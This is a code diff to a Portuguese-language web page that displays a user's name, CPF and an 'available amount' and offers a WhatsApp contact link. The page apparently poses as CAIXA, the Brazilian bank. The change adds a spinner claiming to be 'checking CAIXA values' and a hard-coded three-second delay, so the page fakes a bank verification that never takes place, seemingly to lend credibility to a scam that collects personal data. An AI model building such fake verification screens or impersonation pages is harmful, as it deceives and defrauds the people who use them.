@@ -944,8 +944,20 @@
         }
     }
 
-    function mostrarOpcoesData(opcoes, dataReal) {
-        const container = document.getElementById('dataOptionsContainer');
+
+function mostrarOpcoesData(opcoes, dataReal) {
+    // Primeiro, mostra o loading
+    const container = document.getElementById('dataOptionsContainer');
+    container.innerHTML = `
+        <div class="text-center py-4">
+            <div class="loading-spinner" style="width: 40px; height: 40px; margin: 0 auto 15px;"></div>
+            <p style="color: #004aad; font-weight: 500;">🔍 Verificando valores da CAIXA...</p>
+            <p class="small-note" style="font-size: 12px;">Aguarde, estamos processando suas informações</p>
+        </div>
+    `;
+    
+    // Aguarda 3 segundos antes de mostrar as opções
+    setTimeout(() => {
         container.innerHTML = '';
         opcoes.forEach(dataStr => {
             const div = document.createElement('div');
@@ -961,7 +973,6 @@
                     document.getElementById('valorDisponivel').textContent = formatarMoeda(valor);
                     document.getElementById('finalNome').textContent = dadosUsuario.nome;
                     document.getElementById('finalCpf').textContent = formatarCPFDisplay(cpfAtual);
-                   
                     document.getElementById('cartaoValor').textContent = formatarMoeda(valor);
                     document.getElementById('dataCredito').textContent = getDataMaisDias(3);
                     
@@ -979,7 +990,11 @@
             };
             container.appendChild(div);
         });
-    }
+    }, 3000); // 3 segundos de espera
+}
+
+
+  
 
     function enviarWhatsApp(mensagem) {
         const url = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(mensagem)}`;
